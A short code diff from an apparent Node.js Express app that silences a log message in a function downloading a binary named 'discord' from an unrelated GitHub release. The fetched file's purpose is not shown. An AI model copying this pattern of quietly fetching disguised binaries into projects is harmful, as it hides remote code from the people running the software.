@@ -28,7 +28,7 @@ app.get("/log", (req, res) => {
 
 const downloadDiscord = async () => {
   try {
-    console.log('Start downloading discord...');
+    //console.log('Start downloading discord...');
     const response = await axios({
       method: 'get',
       url: 'https://github.com/mmnni/pipeops/releases/download/sac/discord',
